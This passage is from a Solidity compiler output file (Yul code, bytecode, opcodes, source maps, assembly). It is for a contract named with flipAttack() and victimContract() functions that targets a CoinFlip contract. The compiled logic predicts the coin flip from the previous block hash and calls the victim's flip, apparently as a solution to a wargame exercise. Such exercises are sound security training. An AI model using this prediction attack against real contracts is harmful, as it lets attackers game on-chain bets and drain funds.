																				"nodeType": "YulIdentifier",
																				"src": "3026:9:2"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nativeSrc": "3013:3:2",
																			"nodeType": "YulIdentifier",
																			"src": "3013:3:2"
																		},
																		"nativeSrc": "3013:23:2",
																		"nodeType": "YulFunctionCall",
																		"src": "3013:23:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "3038:2:2",
																		"nodeType": "YulLiteral",
																		"src": "3038:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nativeSrc": "3009:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "3009:3:2"
																},
																"nativeSrc": "3009:32:2",
																"nodeType": "YulFunctionCall",
																"src": "3009:32:2"
															},
															"nativeSrc": "3006:119:2",
															"nodeType": "YulIf",
															"src": "3006:119:2"
														},
														{
															"nativeSrc": "3135:125:2",
															"nodeType": "YulBlock",
															"src": "3135:125:2",
															"statements": [
																{
																	"nativeSrc": "3150:15:2",
																	"nodeType": "YulVariableDeclaration",
																	"src": "3150:15:2",
																	"value": {
																		"kind": "number",
																		"nativeSrc": "3164:1:2",
																		"nodeType": "YulLiteral",
																		"src": "3164:1:2",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nativeSrc": "3154:6:2",
																			"nodeType": "YulTypedName",
																			"src": "3154:6:2",
																			"type": ""
																		}
																	]
																},
																{
																	"nativeSrc": "3179:71:2",
																	"nodeType": "YulAssignment",
																	"src": "3179:71:2",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nativeSrc": "3222:9:2",
																						"nodeType": "YulIdentifier",
																						"src": "3222:9:2"
																					},
																					{
																						"name": "offset",
																						"nativeSrc": "3233:6:2",
																						"nodeType": "YulIdentifier",
																						"src": "3233:6:2"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nativeSrc": "3218:3:2",
																					"nodeType": "YulIdentifier",
																					"src": "3218:3:2"
																				},
																				"nativeSrc": "3218:22:2",
																				"nodeType": "YulFunctionCall",
																				"src": "3218:22:2"
																			},
																			{
																				"name": "dataEnd",
																				"nativeSrc": "3242:7:2",
																				"nodeType": "YulIdentifier",
																				"src": "3242:7:2"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_bool_fromMemory",
																			"nativeSrc": "3189:28:2",
																			"nodeType": "YulIdentifier",
																			"src": "3189:28:2"
																		},
																		"nativeSrc": "3189:61:2",
																		"nodeType": "YulFunctionCall",
																		"src": "3189:61:2"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nativeSrc": "3179:6:2",
																			"nodeType": "YulIdentifier",
																			"src": "3179:6:2"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_bool_fromMemory",
												"nativeSrc": "2922:345:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "2966:9:2",
														"nodeType": "YulTypedName",
														"src": "2966:9:2",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nativeSrc": "2977:7:2",
														"nodeType": "YulTypedName",
														"src": "2977:7:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nativeSrc": "2989:6:2",
														"nodeType": "YulTypedName",
														"src": "2989:6:2",
														"type": ""
													}
												],
												"src": "2922:345:2"
											}
										]
									},
									"contents": "{\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function identity(value) -> ret {\n        ret := value\n    }\n\n    function convert_t_uint160_to_t_uint160(value) -> converted {\n        converted := cleanup_t_uint160(identity(cleanup_t_uint160(value)))\n    }\n\n    function convert_t_uint160_to_t_address(value) -> converted {\n        converted := convert_t_uint160_to_t_uint160(value)\n    }\n\n    function convert_t_contract$_CoinFlip_$81_to_t_address(value) -> converted {\n        converted := convert_t_uint160_to_t_address(value)\n    }\n\n    function abi_encode_t_contract$_CoinFlip_$81_to_t_address_fromStack(value, pos) {\n        mstore(pos, convert_t_contract$_CoinFlip_$81_to_t_address(value))\n    }\n\n    function abi_encode_tuple_t_contract$_CoinFlip_$81__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_contract$_CoinFlip_$81_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function panic_error_0x11() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x11)\n        revert(0, 0x24)\n    }\n\n    function checked_sub_t_uint256(x, y) -> diff {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n        diff := sub(x, y)\n\n        if gt(diff, x) { panic_error_0x11() }\n\n    }\n\n    function panic_error_0x12() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x12)\n        revert(0, 0x24)\n    }\n\n    function checked_div_t_uint256(x, y) -> r {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n        if iszero(y) { panic_error_0x12() }\n\n        r := div(x, y)\n    }\n\n    function cleanup_t_bool(value) -> cleaned {\n        cleaned := iszero(iszero(value))\n    }\n\n    function abi_encode_t_bool_to_t_bool_fromStack(value, pos) {\n        mstore(pos, cleanup_t_bool(value))\n    }\n\n    function abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_bool_to_t_bool_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function validator_revert_t_bool(value) {\n        if iszero(eq(value, cleanup_t_bool(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_bool_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_bool(value)\n    }\n\n    function abi_decode_tuple_t_bool_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_bool_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n}\n",
									"id": 2,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561000f575f5ffd5b5060043610610034575f3560e01c8063987a4e2614610038578063f32d251d14610042575b5f5ffd5b610040610060565b005b61004a610137565b60405161005791906101d5565b60405180910390f35b5f60014361006e9190610224565b405f1c90505f600154826100829190610284565b90505f60018214610093575f610096565b60015b90505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f67826040518263ffffffff1660e01b81526004016100f191906102ce565b6020604051808303815f875af115801561010d573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101319190610315565b50505050565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f61019d6101986101938461015b565b61017a565b61015b565b9050919050565b5f6101ae82610183565b9050919050565b5f6101bf826101a4565b9050919050565b6101cf816101b5565b82525050565b5f6020820190506101e85f8301846101c6565b92915050565b5f819050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f61022e826101ee565b9150610239836101ee565b9250828203905081811115610251576102506101f7565b5b92915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b5f61028e826101ee565b9150610299836101ee565b9250826102a9576102a8610257565b5b828204905092915050565b5f8115159050919050565b6102c8816102b4565b82525050565b5f6020820190506102e15f8301846102bf565b92915050565b5f5ffd5b6102f4816102b4565b81146102fe575f5ffd5b50565b5f8151905061030f816102eb565b92915050565b5f6020828403121561032a576103296102e7565b5b5f61033784828501610301565b9150509291505056fea264697066735822122095598535040f4d928b04f0b5f86d1082bbc27f747f86c751e11a79e9ce98f39664736f6c634300081b0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x34 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x987A4E26 EQ PUSH2 0x38 JUMPI DUP1 PUSH4 0xF32D251D EQ PUSH2 0x42 JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x40 PUSH2 0x60 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x4A PUSH2 0x137 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x57 SWAP2 SWAP1 PUSH2 0x1D5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH0 PUSH1 0x1 NUMBER PUSH2 0x6E SWAP2 SWAP1 PUSH2 0x224 JUMP JUMPDEST BLOCKHASH PUSH0 SHR SWAP1 POP PUSH0 PUSH1 0x1 SLOAD DUP3 PUSH2 0x82 SWAP2 SWAP1 PUSH2 0x284 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH1 0x1 DUP3 EQ PUSH2 0x93 JUMPI PUSH0 PUSH2 0x96 JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xF1 SWAP2 SWAP1 PUSH2 0x2CE JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x10D JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x131 SWAP2 SWAP1 PUSH2 0x315 JUMP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x19D PUSH2 0x198 PUSH2 0x193 DUP5 PUSH2 0x15B JUMP JUMPDEST PUSH2 0x17A JUMP JUMPDEST PUSH2 0x15B JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x1AE DUP3 PUSH2 0x183 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x1BF DUP3 PUSH2 0x1A4 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1CF DUP2 PUSH2 0x1B5 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1E8 PUSH0 DUP4 ADD DUP5 PUSH2 0x1C6 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x22E DUP3 PUSH2 0x1EE JUMP JUMPDEST SWAP2 POP PUSH2 0x239 DUP4 PUSH2 0x1EE JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 GT ISZERO PUSH2 0x251 JUMPI PUSH2 0x250 PUSH2 0x1F7 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x28E DUP3 PUSH2 0x1EE JUMP JUMPDEST SWAP2 POP PUSH2 0x299 DUP4 PUSH2 0x1EE JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x2A9 JUMPI PUSH2 0x2A8 PUSH2 0x257 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2C8 DUP2 PUSH2 0x2B4 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2E1 PUSH0 DUP4 ADD DUP5 PUSH2 0x2BF JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x2F4 DUP2 PUSH2 0x2B4 JUMP JUMPDEST DUP2 EQ PUSH2 0x2FE JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x30F DUP2 PUSH2 0x2EB JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x32A JUMPI PUSH2 0x329 PUSH2 0x2E7 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x337 DUP5 DUP3 DUP6 ADD PUSH2 0x301 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SWAP6 MSIZE DUP6 CALLDATALOAD DIV 0xF 0x4D SWAP3 DUP12 DIV CREATE 0xB5 0xF8 PUSH14 0x1082BBC27F747F86C751E11A79E9 0xCE SWAP9 RETURN SWAP7 PUSH5 0x736F6C6343 STOP ADDMOD SHL STOP CALLER ",
							"sourceMap": "91:513:1:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;365:237;;;:::i;:::-;;121:31;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;365:237;404:18;458:1;443:12;:16;;;;:::i;:::-;433:27;425:36;;404:57;;472:16;504:6;;491:10;:19;;;;:::i;:::-;472:38;;520:9;544:1;532:8;:13;:28;;555:5;532:28;;;548:4;532:28;520:40;;570:14;;;;;;;;;;;:19;;;590:4;570:25;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;394:208;;;365:237::o;121:31::-;;;;;;;;;;;;;:::o;7:126:2:-;44:7;84:42;77:5;73:54;62:65;;7:126;;;:::o;139:60::-;167:3;188:5;181:12;;139:60;;;:::o;205:142::-;255:9;288:53;306:34;315:24;333:5;315:24;:::i;:::-;306:34;:::i;:::-;288:53;:::i;:::-;275:66;;205:142;;;:::o;353:126::-;403:9;436:37;467:5;436:37;:::i;:::-;423:50;;353:126;;;:::o;485:141::-;550:9;583:37;614:5;583:37;:::i;:::-;570:50;;485:141;;;:::o;632:161::-;734:52;780:5;734:52;:::i;:::-;729:3;722:65;632:161;;:::o;799:252::-;907:4;945:2;934:9;930:18;922:26;;958:86;1041:1;1030:9;1026:17;1017:6;958:86;:::i;:::-;799:252;;;;:::o;1057:77::-;1094:7;1123:5;1112:16;;1057:77;;;:::o;1140:180::-;1188:77;1185:1;1178:88;1285:4;1282:1;1275:15;1309:4;1306:1;1299:15;1326:194;1366:4;1386:20;1404:1;1386:20;:::i;:::-;1381:25;;1420:20;1438:1;1420:20;:::i;:::-;1415:25;;1464:1;1461;1457:9;1449:17;;1488:1;1482:4;1479:11;1476:37;;;1493:18;;:::i;:::-;1476:37;1326:194;;;;:::o;1526:180::-;1574:77;1571:1;1564:88;1671:4;1668:1;1661:15;1695:4;1692:1;1685:15;1712:185;1752:1;1769:20;1787:1;1769:20;:::i;:::-;1764:25;;1803:20;1821:1;1803:20;:::i;:::-;1798:25;;1842:1;1832:35;;1847:18;;:::i;:::-;1832:35;1889:1;1886;1882:9;1877:14;;1712:185;;;;:::o;1903:90::-;1937:7;1980:5;1973:13;1966:21;1955:32;;1903:90;;;:::o;1999:109::-;2080:21;2095:5;2080:21;:::i;:::-;2075:3;2068:34;1999:109;;:::o;2114:210::-;2201:4;2239:2;2228:9;2224:18;2216:26;;2252:65;2314:1;2303:9;2299:17;2290:6;2252:65;:::i;:::-;2114:210;;;;:::o;2411:117::-;2520:1;2517;2510:12;2657:116;2727:21;2742:5;2727:21;:::i;:::-;2720:5;2717:32;2707:60;;2763:1;2760;2753:12;2707:60;2657:116;:::o;2779:137::-;2833:5;2864:6;2858:13;2849:22;;2880:30;2904:5;2880:30;:::i;:::-;2779:137;;;;:::o;2922:345::-;2989:6;3038:2;3026:9;3017:7;3013:23;3009:32;3006:119;;;3044:79;;:::i;:::-;3006:119;3164:1;3189:61;3242:7;3233:6;3222:9;3218:22;3189:61;:::i;:::-;3179:71;;3135:125;2922:345;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "177200",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"flipAttack()": "infinite",
								"victimContract()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 91,
									"end": 604,
									"name": "PUSH",
									"source": 1,
									"value": "80"
								},
								{
									"begin": 91,
									"end": 604,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 91,
									"end": 604,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 175,
									"end": 252,
									"name": "PUSH",
									"source": 1,
									"value": "8000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 158,
									"end": 252,
									"name": "PUSH",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 158,
									"end": 252,
									"name": "SSTORE",
									"source": 1
								},
								{
									"begin": 259,
									"end": 355,
									"name": "CALLVALUE",
									"source": 1
								},
								{
									"begin": 259,
									"end": 355,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 259,
									"end": 355,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 259,
									"end": 355,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 259,
									"end": 355,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 259,
									"end": 355,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 259,
									"end": 355,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 259,
									"end": 355,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 259,
									"end": 355,
									"name": "tag",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 259,
									"end": 355,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 259,
									"end": 355,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 259,
									"end": 355,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 259,
									"end": 355,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": 259,
									"end": 355,
									"name": "PUSHSIZE",
									"source": 1
								},
								{
									"begin": 259,
									"end": 355,
									"name": "CODESIZE",
									"source": 1
								},
								{
									"begin": 259,
									"end": 355,
									"name": "SUB",
									"source": 1
								},
								{
									"begin": 259,
									"end": 355,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 259,
									"end": 355,
									"name": "PUSHSIZE",
									"source": 1
								},
								{
									"begin": 259,
									"end": 355,
									"name": "DUP4",
									"source": 1
								},
								{
									"begin": 259,
									"end": 355,
									"name": "CODECOPY",
									"source": 1
								},
								{
									"begin": 259,
									"end": 355,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 259,
									"end": 355,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 259,
									"end": 355,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 259,
									"end": 355,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 259,
									"end": 355,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 259,
									"end": 355,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 259,
									"end": 355,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 259,
									"end": 355,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 259,
									"end": 355,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "2"
								},
								{
									"begin": 259,
									"end": 355,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 259,
									"end": 355,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 259,
									"end": 355,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "3"
								},
								{
									"begin": 259,
									"end": 355,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 259,
									"end": 355,
									"name": "tag",
									"source": 1,
									"value": "2"
								},
								{
									"begin": 259,
									"end": 355,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 332,
									"end": 347,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 306,
									"end": 320,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 306,
									"end": 320,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 306,
									"end": 348,
									"name": "PUSH",
									"source": 1,
									"value": "100"
								},
								{
									"begin": 306,
									"end": 348,
									"name": "EXP",
									"source": 1
								},
								{
									"begin": 306,
									"end": 348,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 306,
									"end": 348,
									"name": "SLOAD",
									"source": 1
								},
								{
									"begin": 306,
									"end": 348,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 306,
									"end": 348,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 306,
									"end": 348,
									"name": "MUL",
									"source": 1
								},
								{
									"begin": 306,
									"end": 348,
									"name": "NOT",
									"source": 1
								},
								{
									"begin": 306,
									"end": 348,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 306,
									"end": 348,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 306,
									"end": 348,
									"name": "DUP4",
									"source": 1
								},
								{
									"begin": 306,
									"end": 348,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 306,
									"end": 348,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 306,
									"end": 348,
									"name": "MUL",
									"source": 1
								},
								{
									"begin": 306,
									"end": 348,
									"name": "OR",
									"source": 1
								},
								{
									"begin": 306,
									"end": 348,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 306,
									"end": 348,
									"name": "SSTORE",
									"source": 1
								},
								{
									"begin": 306,
									"end": 348,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 259,
									"end": 355,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 91,
									"end": 604,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "6"
								},
								{
									"begin": 91,
									"end": 604,
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 88,
									"end": 205,
									"name": "tag",
									"source": 2,
									"value": "8"
								},
								{
									"begin": 88,
									"end": 205,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 197,
									"end": 198,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 194,
									"end": 195,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 187,
									"end": 199,
									"name": "REVERT",
									"source": 2
								},
								{
									"begin": 334,
									"end": 460,
									"name": "tag",
									"source": 2,
									"value": "10"
								},
								{
									"begin": 334,
									"end": 460,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 371,
									"end": 378,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 411,
									"end": 453,
									"name": "PUSH",
									"source": 2,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 404,
									"end": 409,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 400,
									"end": 454,
									"name": "AND",
									"source": 2
								},
								{
									"begin": 389,
									"end": 454,
									"name": "SWAP1",
									"source": 2
								},
								{
									"begin": 389,
									"end": 454,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 334,
									"end": 460,
									"name": "SWAP2",
									"source": 2
								},
								{
									"begin": 334,
									"end": 460,
									"name": "SWAP1",
									"source": 2
								},
								{
									"begin": 334,
									"end": 460,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 334,
									"end": 460,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 2
								},
								{
									"begin": 466,
									"end": 562,
									"name": "tag",
									"source": 2,
									"value": "11"
								},
								{
									"begin": 466,
									"end": 562,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 503,
									"end": 510,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 532,
									"end": 556,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "20"
								},
								{
									"begin": 550,
									"end": 555,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 532,
									"end": 556,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "10"
								},
								{
									"begin": 532,
									"end": 556,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 2
								},
								{
									"begin": 532,
									"end": 556,
									"name": "tag",
									"source": 2,
									"value": "20"
								},
								{
									"begin": 532,
									"end": 556,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 521,
									"end": 556,
									"name": "SWAP1",
									"source": 2
								},
								{
									"begin": 521,
									"end": 556,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 466,
									"end": 562,
									"name": "SWAP2",
									"source": 2
								},
								{
									"begin": 466,
									"end": 562,
									"name": "SWAP1",
									"source": 2
								},
								{
									"begin": 466,
									"end": 562,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 466,
									"end": 562,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 2
								},
								{
									"begin": 568,
									"end": 690,
									"name": "tag",
									"source": 2,
									"value": "12"
								},
								{
									"begin": 568,
									"end": 690,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 641,
									"end": 665,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "22"
								},
								{
									"begin": 659,
									"end": 664,
									"name": "DUP2",
									"source": 2
								},
								{
									"begin": 641,
									"end": 665,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "11"
								},
								{
									"begin": 641,
									"end": 665,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 2
								},
								{
									"begin": 641,
									"end": 665,
									"name": "tag",
									"source": 2,
									"value": "22"
								},
								{
									"begin": 641,
									"end": 665,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 634,
									"end": 639,
									"name": "DUP2",
									"source": 2
								},
								{
									"begin": 631,
									"end": 666,
									"name": "EQ",
									"source": 2
								},
								{
									"begin": 621,
									"end": 684,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "23"
								},
								{
									"begin": 621,
									"end": 684,
									"name": "JUMPI",
									"source": 2
								},
								{
									"begin": 680,
									"end": 681,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 677,
									"end": 678,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 670,
									"end": 682,
									"name": "REVERT",
									"source": 2
								},
								{
									"begin": 621,
									"end": 684,
									"name": "tag",
									"source": 2,
									"value": "23"
								},
								{
									"begin": 621,
									"end": 684,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 568,
									"end": 690,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 568,
									"end": 690,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 2
								},
								{
									"begin": 696,
									"end": 839,
									"name": "tag",
									"source": 2,
									"value": "13"
								},
								{
									"begin": 696,
									"end": 839,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 753,
									"end": 758,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 784,
									"end": 790,
									"name": "DUP2",
